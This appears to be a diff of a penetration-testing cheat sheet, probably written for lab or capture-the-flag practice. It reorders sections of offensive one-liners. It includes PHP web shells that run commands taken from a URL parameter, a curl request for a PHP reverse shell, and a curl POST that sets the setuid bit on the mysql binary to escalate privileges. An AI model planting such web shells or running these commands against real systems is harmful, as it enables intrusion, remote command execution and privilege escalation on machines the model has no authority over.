@@ -27,6 +27,13 @@ python2 -m SimpleHTTPServer 80
 python3 -m http.server 80
 ```
 
+## PHP cmd injection
+```
+<?php system("whoami"); ?>
+<?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+```
+
 ## Curl request
 ```
 #GET:
@@ -34,13 +41,6 @@ curl -i -s -k -X $'GET' $'https://10.1.1.1/php-reverse-shell.php'
 
 #POST:
 curl -i -s -k -X $'POST' --data-binary $'cmd=chmod%20%2Bs%20%2Fusr%2Fbin%2Fmysql&submit' $'http://10.1.1.1:8080/start_page.php?page=cmd.php'
-```
-
-## PHP cmd injection
-```
-<?php system("whoami"); ?>
-<?php system($_GET['cmd']); ?>
-<?php passthru($_GET['cmd']); ?>
 ```
 
 ## Find something
